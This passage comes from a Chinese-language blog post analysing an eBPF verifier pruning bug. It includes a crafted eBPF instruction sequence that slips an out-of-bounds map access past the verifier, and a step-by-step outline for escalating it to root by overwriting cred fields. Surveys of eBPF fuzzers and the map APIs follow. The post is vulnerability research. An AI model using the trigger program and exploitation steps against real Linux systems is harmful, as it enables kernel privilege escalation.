class="number">-5</span>: R6=<span class="number">0</span>, R7=<span class="number">2</span></span><br><span class="line">   指令 <span class="number">8</span>: R6=<span class="number">0</span>, R7=<span class="number">2</span> (R6: P, R7: 非精确)</span><br><span class="line">   [PRUNED: 等价于指令 <span class="number">8</span> (R6=<span class="number">0</span>, R7=<span class="number">0</span>)]</span><br><span class="line">   ※ 继续路径:</span><br><span class="line">       指令 <span class="number">14</span><span class="number">-16</span>: R6=<span class="number">0</span> → 写入 r0 + <span class="number">0</span>, 安全</span><br></pre></td></tr></table></figure>
+<p>但循环遍历所有分支会造成时间复杂度以指数级增长，所以<code>verifier</code>引入了对路径的剪枝<code>pruning</code></p>
+<p>即上述<code>[PRUNED: 等价于指令 8 (R6=0, R7=0)]</code></p>
+<p>即<code>verifier</code>检测到<code>5-&gt;6-&gt;7-&gt;8</code>之后的状态与<code>5-&gt;8</code>之后的状态是相同的，在检查过<code>5-&gt;6-&gt;7-&gt;8</code>之后就不会再检查<code>5-&gt;8</code>的分支，即完成剪枝。</p>
+<p><strong>剪枝点（指令 8）</strong></p>
+<ul>
+<li>状态比较
+<ul>
+<li><strong>旧状态</strong>（指令 6-7 路径）：R6=0, R7=0（R6: P, R7: 非精确）。</li>
+<li><strong>新状态</strong>（指令 4-5 路径）：R6=0, R7=2（R6: P, R7: 非精确）。</li>
+</ul></li>
+<li>比较逻辑
+<ul>
+<li><strong>精确寄存器</strong>：R6=0（旧）等于 R6=0（新），匹配。</li>
+<li><strong>非精确寄存器</strong>：R7=0（旧）与 R7=2（新）不同，但 r7 非精确，验证器忽略差异。</li>
+</ul></li>
+</ul>
+</blockquote>
+<p>在该漏洞被修复之前，<code>verifier</code>是不会对比较跳转指令做寄存器的精确标记的，但综合前几个<code>CVE</code>我们可以得知，比较指令是可以改变<code>reg_state -&gt; var_off</code>的，比如<code>r9 = 0, if r6 &lt;= r9 ...</code>，那在<code>verifier</code>眼中<code>r6</code>就只能是0。</p>
+<p>下面我们考虑这样一个程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: (b7) r6 = <span class="number">1024</span></span><br><span class="line">   <span class="number">1</span>: (b7) r7 = <span class="number">0</span></span><br><span class="line">   <span class="number">2</span>: (b7) r8 = <span class="number">0</span></span><br><span class="line">   <span class="number">3</span>: (b7) r9 = <span class="number">-2147483648</span></span><br><span class="line">   <span class="number">4</span>: (<span class="number">97</span>) r6 %= <span class="number">1025</span></span><br><span class="line">   <span class="number">5</span>: (<span class="number">05</span>) <span class="keyword">goto</span> pc+<span class="number">0</span></span><br><span class="line">   <span class="number">6</span>: (bd) <span class="keyword">if</span> r6 &lt;= r9 <span class="keyword">goto</span> pc+<span class="number">2</span></span><br><span class="line">   <span class="number">7</span>: (<span class="number">97</span>) r6 %= <span class="number">1</span></span><br><span class="line">   <span class="number">8</span>: (b7) r9 = <span class="number">0</span></span><br><span class="line">   <span class="number">9</span>: (bd) <span class="keyword">if</span> r6 &lt;= r9 <span class="keyword">goto</span> pc+<span class="number">1</span></span><br><span class="line">  <span class="number">10</span>: (b7) r6 = <span class="number">0</span></span><br><span class="line">  <span class="number">11</span>: (b7) r0 = <span class="number">0</span></span><br><span class="line">  <span class="number">12</span>: (<span class="number">63</span>) *(u32 *)(r10 <span class="number">-4</span>) = r0</span><br><span class="line">  <span class="number">13</span>: (<span class="number">18</span>) r4 = <span class="number">0xffff888103693400</span> <span class="comment">// map_ptr(ks=4,vs=48)</span></span><br><span class="line">  <span class="number">15</span>: (bf) r1 = r4</span><br><span class="line">  <span class="number">16</span>: (bf) r2 = r10</span><br><span class="line">  <span class="number">17</span>: (<span class="number">07</span>) r2 += <span class="number">-4</span></span><br><span class="line">  <span class="number">18</span>: (<span class="number">85</span>) call bpf_map_lookup_elem#<span class="number">1</span></span><br><span class="line">  <span class="number">19</span>: (<span class="number">55</span>) <span class="keyword">if</span> r0 != <span class="number">0x0</span> <span class="keyword">goto</span> pc+<span class="number">1</span></span><br><span class="line">  <span class="number">20</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br><span class="line">  <span class="number">21</span>: (<span class="number">77</span>) r6 &gt;&gt;= <span class="number">10</span></span><br><span class="line">  <span class="number">22</span>: (<span class="number">27</span>) r6 *= <span class="number">8192</span></span><br><span class="line">  <span class="number">23</span>: (bf) r1 = r0</span><br><span class="line">  <span class="number">24</span>: (<span class="number">0f</span>) r0 += r6</span><br><span class="line">  <span class="number">25</span>: (<span class="number">79</span>) r3 = *(u64 *)(r0 +<span class="number">0</span>)</span><br><span class="line">  <span class="number">26</span>: (<span class="number">7b</span>) *(u64 *)(r1 +<span class="number">0</span>) = r3</span><br><span class="line">  <span class="number">27</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<p>我们可以画出如下语法树与状态跟踪图：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Root (指令 0-4)</span><br><span class="line">  <span class="attribute">R6</span>=1024, <span class="attribute">R9</span>=-2147483648</span><br><span class="line">  ↓ (第 4 行: r6 %= 1025)</span><br><span class="line">指令 6 (<span class="keyword">if</span> r6 &lt;= r9)</span><br><span class="line">  <span class="attribute">R6</span>=scalar(), <span class="attribute">R9</span>=-2147483648 (R6: P, R9: 非精确)</span><br><span class="line">  ├── 分支: 继续到 7 (r6 &gt; -2147483648)</span><br><span class="line">  │   指令 7-8 (r6 %= 1, r9 = 0)</span><br><span class="line">  │     <span class="attribute">R6</span>=0, <span class="attribute">R9</span>=0 (R6: P, R9: 非精确)</span><br><span class="line">  │     ↓</span><br><span class="line">  │   指令 9 (<span class="keyword">if</span> r6 &lt;= r9)</span><br><span class="line">  │     <span class="attribute">R6</span>=0, <span class="attribute">R9</span>=0 (R6: P, R9: 非精确)</span><br><span class="line">  │     ├── 分支: 跳转到 11 (r6 &lt;= 0)</span><br><span class="line">  │     │   指令 11-19</span><br><span class="line">  │     │     <span class="attribute">R6</span>=0, <span class="attribute">R9</span>=0 (R6: P)</span><br><span class="line">  │     │     ↓</span><br><span class="line">  │     │   指令 19 (<span class="keyword">if</span> r0 != 0x0)</span><br><span class="line">  │     │     ├── 分支: 跳转到 21 (r0 != 0)</span><br><span class="line">  │     │     │   指令 21-24 (r6 &gt;&gt;= 10, r6 *= 8192, r0 += r6)</span><br><span class="line">  │     │     │     <span class="attribute">R6</span>=0 (R6: P)</span><br><span class="line">  │     │     │     访问 r0 + 0: 安全</span><br><span class="line">  │     │     └── 分支: 退出 (r0 == 0)</span><br><span class="line">  │     │         安全</span><br><span class="line">  │     └── 分支: 继续到 10 (r6 &gt; 0)</span><br><span class="line">  │         指令 10 (r6 = 0)</span><br><span class="line">  │           <span class="attribute">R6</span>=0, <span class="attribute">R9</span>=0 (R6: P)</span><br><span class="line">  │           ↓</span><br><span class="line">  │         指令 11-19 (同上)</span><br><span class="line">  │           访问 r0 + 0: 安全</span><br><span class="line">  └── 分支: 跳转到 9 (r6 &lt;= -2147483648)</span><br><span class="line">      指令 9 (<span class="keyword">if</span> r6 &lt;= r9)</span><br><span class="line">        <span class="attribute">R6</span>=scalar(umax=18446744071562067968), <span class="attribute">R9</span>=-2147483648 (R6: P, R9: 非精确)</span><br><span class="line">        [PRUNED: 验证器认为等价于指令 9 的状态 (<span class="attribute">R6</span>=0, <span class="attribute">R9</span>=0)]</span><br><span class="line">        ※ 未探索路径：</span><br><span class="line">          ├── 分支: 跳转到 11 (r6 &lt;= -2147483648)</span><br><span class="line">          │   指令 11-19</span><br><span class="line">          │     <span class="attribute">R6</span>=1024 (运行时值), <span class="attribute">R9</span>=-2147483648</span><br><span class="line">          │     ↓</span><br><span class="line">          │   指令 19-24</span><br><span class="line">          │     <span class="attribute">R6</span>=8192 (1024 &gt;&gt; 10 = 1, 1 * 8192 = 8192)</span><br><span class="line">          │     访问 r0 + 8192: 越界！</span><br><span class="line">          └── 分支: 继续到 10 (r6 &gt; -2147483648)</span><br><span class="line">              指令 10-24</span><br><span class="line">                <span class="attribute">R6</span>=0</span><br><span class="line">                访问 r0 + 0: 安全</span><br></pre></td></tr></table></figure>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250608232602972.png" alt><figcaption>image-20250608232602972</figcaption>
+</figure>
+<blockquote>
+<p>图中，白色框表示解析出的正常代码块，旁边是我们定义的该代码块的序号，绿色框是我们特殊标注的分支语句的代码块，粉色框中代码着<code>verfier</code>解析到该代码块时，对该代码块判定的<strong>状态</strong>。</p>
+</blockquote>
+<p><code>verifier</code>在解析一个语法树时会先按照所有分支<code>False</code>的逻辑进行<strong>中序遍历</strong>。</p>
+<p>由图所示，当程序按照绿色线路遍历<code>1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7-&gt;exit-&gt;7-&gt;8</code>时，<strong>在程序下行遍历时</strong>，<code>verifier</code>记录每个代码块在进入时的<strong>寄存器状态组，声明为该代码块的状态</strong>，如果该代码块已经存在一个状态，<strong>那么就需要通过比较新旧状态的差异来裁决是否需要剪枝（后续讨论）</strong>，在<code>verifier</code>运行时会有如下输出，流程图中为节省空间，故只标出需要关注的部分。</p>
+<p>现在程序按照路径运行到<code>8</code>代码块，检测到了<code>r6</code>被用于和<code>map</code>指针的算数操作，故<code>r6</code>需要被标注为精确，这时<code>backtrack_insn()</code>被调用，上行回溯将每个父节点（代码块）的状态中的<code>r6</code>标记为<strong>精确</strong></p>
+<blockquote>
+<p>在<code>verifier</code>在寄存器状态组中，<code>r6 = 0 / r6 = scalar()</code>表示<code>r6</code>是非精确的，<code>r6 = P0 / r6 = Pscalar()</code>表示<code>r6</code>是精确的，对寄存器的精确标注通常在前面加一个<code>P</code>来表示。</p>
+</blockquote>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250608232615823.png" alt><figcaption>image-20250608232615823</figcaption>
+</figure>
+<blockquote>
+<p>上图中蓝线表示已经遍历过的路径，红线表示我们讨论的，正在执行的路径</p>
+</blockquote>
+<p>现在程序已经遍历了<code>1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7-&gt;exit-&gt;(-&gt;7)8-&gt;(-&gt;7-&gt;6-&gt;5-&gt;4)-&gt;6-&gt;...</code>, 回溯到<code>2</code>, 开始遍历<code>True</code>路径，此时进入到<code>4</code>中会生成关于<code>4</code>的新状态<code>r6 = scalar(), r9 = -214...</code>， <code>verifier</code>判断旧状态是新状态的超集，将当前路径剪枝。</p>
+<blockquote>
+<p>4-&gt;new: R1=ctx(off=0,imm=0) R6_w=scalar(umax=18446744071562067968) R7_w=0 R8_w=0 R9_w=-2147483648 R10=fp0.</p>
+<p>4-&gt;old: R6_rwD=Pscalar() R9_rwD=0 R10=fp0</p>
+<p>在新旧状态的比较中，<code>verifier</code>认为<code>Pscalar</code>要比<code>scalar</code>更加精确，并且不关心所有非精确寄存器数值是不是一致的，所以既然在更加严格条件下已经判断了该条代码块下的所有分支是安全的，那在稍微放宽条件的情况下必然安全，<strong>即旧状态是新状态的超集</strong>。<code>verifier</code>会对当前路径进行剪枝。</p>
+</blockquote>
+<p><img src="/2025/06/22/ebpf-verifier/image-20250604194130520.png" alt="image-20250604194130520">但是我们站在第三方的角度可以明显看出，如果该条路径被剪枝，那么在运行时，就会在<code>r0+=r6</code>时引发越界读写的漏洞。</p>
+<p>所以<strong>该漏洞实际上发生在寄存器的精确判定的逻辑上，即我们什么时候应该将一个寄存器判定为精确</strong>（见Appendix）</p>
+<p>我们重新观察<code>3-&gt;4-&gt;6-&gt;7-&gt;8</code>这条路径，为什么这条路径可以通过检查——实际上是因为在条件跳转的比较时，<code>r9</code>的值间接影响了<code>verifier</code>对<code>r6</code>寄存器的数值判断，即<code>r9=0</code>, <code>if r6 &lt;= r9 then jmp</code>的逻辑，让<code>verifier</code>在<code>True</code>分支下将<code>r6</code>的值判定为0。</p>
+<p>所以该漏洞发生的原因是<strong>非精确的寄存器影响了<code>verifier</code>对精确寄存器的数值判断</strong>，<code>linux</code>在之后的版本中在寄存器的精确标记逻辑中新加了一条，<strong>即在条件跳转时，如果一个非精确寄存器和精确寄存器进行比较，那么也会将非精确寄存器标记为精确</strong></p>
+<p>在修改后的版本中我们可以看到<code>4-&gt;old</code>和<code>4-&gt;new</code>是不同的，此时在<code>4-&gt;new</code>中<code>r9</code>被标记为精确：</p>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250604200540447.png" alt><figcaption>image-20250604200540447</figcaption>
+</figure>
+<p><strong>漏洞利用流程：</strong></p>
+<ol type="1">
+<li><p>初始化 eBPF 环境，创建 <code>BPF_MAP_TYPE_ARRAY</code> 型映射用于用户态/内核态通信，以及另一辅助 BPF 映射，通过精确构造的 eBPF 指令序列，在运行时触发漏洞（例如，在 <code>skb_load_bytes_relative</code> 等辅助函数调用时，传递被污染或非预期的参数，如被篡改的寄存器 <code>R6</code> 或栈指针），导致对栈或其他内存区域的越界/非预期读操作。</p></li>
+<li><p>基于已泄露的内核基址，加载第二阶段的 eBPF 程序。这些程序进一步利用 <code>verifier bypass</code> 技术。通过在 eBPF 程序执行流中篡改指向 BPF map 或其他内核对象的指针，使得 BPF 内建的 map 操作函数（如 <code>map_lookup_elem</code>, <code>map_update_elem</code>）或内存访问指令实际作用于指定的任意内核内存地址，而非其原始目标。最终效果是构建起两个核心原语：从任意内核地址读取数据，以及向任意内核地址写入数据。</p></li>
+<li><p>运用已构建的任意内核读原语，在内核地址空间中进行扫描，以定位目标进程的 <code>cred</code>（凭证）结构体。此利用任意内核写原语，将其内部的 <code>uid</code> (用户ID)、<code>gid</code> (组ID)、<code>euid</code> (有效用户ID)、<code>egid</code> (有效组ID) 及相关权能（capabilities）字段覆写为 <code>0</code> (root 用户的标识符)。</p></li>
+<li><p>调用 <code>system("/bin/sh")</code> 继承此 root 权限，从而赋予对系统的完全控制。</p></li>
+</ol>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250604203807422.png" alt><figcaption>image-20250604203807422</figcaption>
+</figure>
+<p>这是漏洞发现者给出的容器逃逸的运行结果，<strong>但我们并未在本地成功复现，我们只实现了系统级别的提权</strong></p>
+<blockquote>
+<p>好像是qemu里是不允许对init进程动手动脚的？暂时不清楚是为什么，但是我们真的找不到可以复现的ubuntu/debian发行版本...</p>
+</blockquote>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250604205005425.png" alt><figcaption>image-20250604205005425</figcaption>
+</figure>
+<h2 id="ebpf-自动化漏洞挖掘">4 eBPF 自动化漏洞挖掘</h2>
+<p>这些项目都聚焦于利用 eBPF技术进行自动化漏洞挖掘。ebpf-fuzzer 和 Buzzer 主要测试 eBPF 验证器，BRF 关注运行时，而 bpf-fuzzer 在用户空间操作，各自解决不同的安全挑战。</p>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250607191128339.png" alt><figcaption>image-20250607191128339</figcaption>
+</figure>
+<ol type="1">
+<li>ebpf-fuzzer
+<ul>
+<li><strong>架构与原理</strong>：ebpf-fuzzer 是一个开源工具，专门用于模糊测试 Linux 内核中的 eBPF 验证器。它通过模拟大量的 eBPF 程序来检测验证器中的漏洞。它的核心原理是使用 QEMU 作为测试环境，生成自定义的 eBPF 样本程序，并观察这些程序在验证器中的行为。如果验证器出现错误（如无限循环），ebpf-fuzzer 就能捕获这些问题。它依赖于 QEMU 提供的虚拟化环境来模拟复杂的内核行为，确保测试的全面性。</li>
+<li><strong>不同点</strong>：与其他工具相比，ebpf-fuzzer 特别注重于 eBPF 验证器的测试，而非运行时。它使用 QEMU 提供的虚拟化环境来模拟测试，这使得它在测试复杂的内核行为时更加灵活，适合研究 eBPF 验证器的安全性。</li>
+</ul></li>
+<li>Buzzer
+<ul>
+<li><strong>架构与原理</strong>：Buzzer 是 Google 开发的开源 eBPF 模糊测试框架，专注于测试 eBPF 验证器的安全性。它通过生成大量的 eBPF 程序（每分钟约 35,000 个）来检测验证器中的逻辑错误。Buzzer 的核心原理是使用一个易用的 eBPF 生成库，支持分布式虚拟机测试（计划中），从而高效地覆盖更多测试场景。它通过快速生成测试用例，确保验证器的鲁棒性。</li>
+<li><strong>不同点</strong>：Buzzer 的生成能力非常强大，能够快速产生大量测试用例，这使得它在覆盖率和效率上优于 ebpf-fuzzer。另外，它支持分布式测试的设计，使其更适合大规模的安全研究，区别于 ebpf-fuzzer 的单机模拟测试。</li>
+</ul></li>
+<li>BRF（BPF Runtime Fuzzer）
+<ul>
+<li><strong>架构与原理</strong>：BRF 是一个学术研究项目，专注于模糊测试 eBPF 运行时，而不是验证器。它通过生成符合 eBPF 验证器语义的程序来测试运行时的行为。BRF 的核心原理是使用高效的模糊测试策略，确保生成的 eBPF 程序不仅能通过验证器，还能在运行时执行，从而发现更深层次的漏洞。它通过优化执行效率和代码覆盖率，显著提升了测试能力。</li>
+<li><strong>不同点</strong>：BRF 与其他工具的最大区别在于它关注 eBPF 运行时，而不是验证器。这使得它能发现验证器无法捕获的运行时错误。同时，BRF 的执行效率和代码覆盖率显著高于 Syzkaller 和 Buzzer，达到了 8 倍和 32 倍的性能提升，适合学术研究和复杂场景测试。</li>
+</ul></li>
+<li>bpf-fuzzer
+<ul>
+<li><strong>架构与原理</strong>：bpf-fuzzer 是一个在用户空间运行的工具，用于模糊测试 eBPF 验证器。它通过 libfuzzer 和 clang sanitizer 来生成测试用例，并在用户空间中执行测试。它的核心原理是利用用户空间的灵活性，避免了直接操作内核的复杂性，同时使用 sanitizer 检测内存泄漏等错误。它通过生成初始测试用例，覆盖验证器的部分行为，确保测试的全面性。</li>
+<li><strong>不同点</strong>：bpf-fuzzer 在用户空间操作，这使得它比其他工具更容易部署和使用，不需要直接访问内核。然而，它的测试范围主要限于验证器，且发现的漏洞数量较少（至少 1 个错误），不如其他工具那样高效，适合用户空间的 eBPF 测试。</li>
+</ul></li>
+</ol>
+<p>针对以上四个项目，我们对<code>bpf-fuzzer</code>项目进行详细介绍：</p>
+<h3 id="bpf-fuzzer">bpf-fuzzer</h3>
+<p>bpf-fuzzer 是 ioVisor 组织的一个开源项目，旨在通过模糊测试来检测 Linux 内核中的 BPF 验证器的漏洞。BPF 是 Linux 内核的一个子系统，用于在内核空间执行用户提供的程序（如网络过滤器、跟踪器等）。由于 BPF 程序运行在内核中，其安全性至关重要，因此需要通过模糊测试来确保其稳定性和安全性。bpf-fuzzer 的开发背景是应对 eBPF 验证器可能存在的逻辑错误或内存问题，特别是在用户空间进行测试以降低部署复杂性。</p>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250607200527678.png" alt><figcaption>image-20250607200527678</figcaption>
+</figure>
+<p>bpf-fuzzer 的架构设计使其能够在用户空间运行，减少了对内核直接访问的依赖。其工作流程包括以下几个关键步骤：</p>
+<ul>
+<li>使用 libfuzzer（LLVM 的模糊测试库）生成随机的 BPF 程序作为测试用例。这些程序旨在模拟各种可能的输入，以触发验证器的潜在漏洞。</li>
+<li>生成的测试用例被传递给 BPF 验证器，验证器会检查这些程序是否符合安全规则（如无无限循环、无非法内存访问等）。如果验证器处理这些程序时出现问题，bpf-fuzzer 会记录这些错误。</li>
+<li>bpf-fuzzer 集成了 clang sanitizer（内存错误检测工具），用于捕获验证器在处理测试用例时的内存泄漏、缓冲区溢出或其他运行时错误。</li>
+<li>项目提供了覆盖率报告，显示其测试<strong>覆盖了 BPF 验证器的 886/1106 条边，约 80%</strong>。</li>
+</ul>
+<p>bpf-fuzzer 提供两个主要二进制文件：test_verifier 用于直接测试 BPF 验证器，test_fuzzer 用于生成初始测试用例，支持开发者和研究者在本地环境中进行测试。</p>
+<p><code>bpf-fuzzer</code>用于模糊测试bpf的<code>verifier</code>模块，主要关注生成的恶意程序可不可以通过<code>verifier</code></p>
+<p>我们关注的点在 <code>verifier</code>的代码覆盖率与执行的行为等因素，同时我们知道在内核空间进行fuzz的速度是很慢的，考虑到内核中上下文切换的开销很大，但这些开销和都是我们不关心的事情。</p>
+<p>所以该项目把内核函数又在一个库文件里重新<code>hook</code>了一下，<strong>现在<code>bpf</code>模块就可以使用我们在用户空间定义的基本函数运行，也就是说我们可以在用户态下进行内核模块的fuzz。</strong></p>
+<p>首先生成包含<code>eBPF verifier</code>及其主要函数<code>bpf_check()</code>的源代码（处理宏并包含头文件），写入<code>.i</code>文件，这一步是为了获得 <code>verifier</code> 引用的所有内核符号。生成<code>.i</code>文件的示例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">KERNEL_SRC=/path/to/kernel/to/fuzz-test</span><br><span class="line">process_example:</span><br><span class="line">    <span class="built_in">cd</span> $(KERNEL_SRC) &amp;&amp;  \</span><br><span class="line">        make HOSTCC=clang CC=clang kernel/bpf/verifier.i</span><br></pre></td></tr></table></figure>
+<p>接着编译每个<code>.i</code>文件并链接到一起，这个过程很复。上一步虽然获得了 <code>verifier</code> 引用的所有的符号声明，但是并未获得所有的定义。例如，已获得<code>kmalloc()</code>函数的定义，但是没有获得该函数的定义。<code>bpf-fuzzer</code>是怎么解决的呢？采用<code>user-space hooks</code>，例如，用用户标准函数<code>malloc()</code>来定义<code>kmalloc()</code>，这两个函数的行为是一样的，<code>BPF verifier</code>不会察觉。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *addr)</span> {</span><br><span class="line">	<span class="built_in">free</span>(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *addr)</span> {</span><br><span class="line">	<span class="built_in">free</span>(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">warn_slowpath_fmt</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">int</span> line, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span> {</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> _copy_to_user(<span class="type">void</span> *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> n) {</span><br><span class="line">	<span class="built_in">memcpy</span>(to, from, n);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<h2 id="appendix">5 Appendix</h2>
+<h3 id="a.-关于bpf_mapqueue-and-stack结构与相关函数">A. 关于bpf_map(Queue and Stack)结构与相关函数</h3>
+<p><code>BPF_MAP_TYPE_QUEUE</code> 和 <code>BPF_MAP_TYPE_STACK</code> 在内核版本 4.20 中引入, <code>bpf_map</code>用于在用户空间和内核空间传递信息。<code>BPF_MAP_TYPE_QUEUE</code> 为 BPF 程序提供 FIFO 存储，<code>BPF_MAP_TYPE_STACK</code> 为 BPF 程序提供 LIFO 存储。这些映射支持 peek、pop 和 push 操作，这些操作通过各自的助手暴露给 BPF 程序。这些操作通过以下方式使用现有的 <code>bpf</code> 系统调用暴露给用户空间应用程序</p>
+<ul>
+<li><code>BPF_MAP_LOOKUP_ELEM</code> -&gt; peek</li>
+<li><code>BPF_MAP_LOOKUP_AND_DELETE_ELEM</code> -&gt; pop</li>
+<li><code>BPF_MAP_UPDATE_ELEM</code> -&gt; push</li>
+</ul>
+<p><code>BPF_MAP_TYPE_QUEUE</code> 和 <code>BPF_MAP_TYPE_STACK</code> 不支持 <code>BPF_F_NO_PREALLOC</code>。</p>
+<p>其中的一些结构和定义如下：</p>
+<ul>
+<li><code>bpf_map_push_elem()</code> (内核空间下)</li>
+</ul>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">long</span> <span class="title">bpf_map_push_elem</span><span class="params">(<span class="keyword">struct</span> bpf_map *map, <span class="type">const</span> <span class="type">void</span> *value, u64 flags)</span></span></span><br></pre></td></tr></table></figure>
+<p>可以使用 <code>bpf_map_push_elem</code> 助手将元素 <code>value</code> 添加到队列或堆栈中。<code>flags</code> 参数必须设置为 <code>BPF_ANY</code> 或 <code>BPF_EXIST</code>。如果 <code>flags</code> 设置为 <code>BPF_EXIST</code>，则当队列或堆栈已满时，将删除最旧的元素，以便为要添加的 <code>value</code> 腾出空间。成功时返回 <code>0</code>，失败时返回负错误。</p>
+<ul>
+<li><code>bpf_map_update_elem()</code>（用户空间下）</li>
+</ul>
+<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bpf_map_update_elem</span> (<span class="type">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *<span class="built_in">key</span>, <span class="keyword">const</span> <span class="keyword">void</span> *value, __u64 flags)</span><br></pre></td></tr></table></figure>
+<p>用户空间程序可以使用 libbpf 的 <code>bpf_map_update_elem</code> 函数将 <code>value</code> 推入队列或堆栈。 <code>key</code> 参数必须设置为 <code>NULL</code>，<code>flags</code> 必须设置为 <code>BPF_ANY</code> 或 <code>BPF_EXIST</code>，其语义与 <code>bpf_map_push_elem</code> 内核助手相同。成功时返回 <code>0</code>，失败时返回负错误。</p>
+<ul>
+<li><code>bpf_map_lookup_elem()</code> (用户空间下)</li>
+</ul>
+<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bpf_map_lookup_elem</span> (<span class="type">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *<span class="built_in">key</span>, <span class="keyword">void</span> *value)</span><br></pre></td></tr></table></figure>
+<p>用户空间程序可以使用 libbpf <code>bpf_map_lookup_elem</code> 函数查看队列或堆栈头部的 <code>value</code>。 <code>key</code> 参数必须设置为 <code>NULL</code>。成功时返回 <code>0</code>，失败时返回负错误。</p>
+<p>在向内核传递的<code>bpf</code>程序中，我们可以通过如下方式来定义一个<code>map</code></p>
+<p>此代码段显示如何在 BPF 程序中声明队列</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">        __uint(type, BPF_MAP_TYPE_QUEUE);</span><br><span class="line">        __type(value, __u32);</span><br><span class="line">        __uint(max_entries, <span class="number">10</span>);</span><br><span class="line">} <span class="built_in">queue</span> <span class="title function_">SEC</span><span class="params">(<span class="string">".maps"</span>)</span>;</span><br></pre></td></tr></table></figure>
+<p>在用户态空间下，我们也可以用更简单的方法声明一个可用于数据传递和共享的<code>map</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create_queue</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">        <span class="keyword">return</span> bpf_map_create(BPF_MAP_TYPE_QUEUE,</span><br><span class="line">                              <span class="string">"sample_queue"</span>, <span class="comment">/* name */</span></span><br><span class="line">                              <span class="number">0</span>,              <span class="comment">/* key size, must be zero */</span></span><br><span class="line">                              <span class="keyword">sizeof</span>(__u32),  <span class="comment">/* value size */</span></span><br><span class="line">                              <span class="number">10</span>,             <span class="comment">/* max entries */</span></span><br><span class="line">                              <span class="literal">NULL</span>);          <span class="comment">/* create options */</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure>
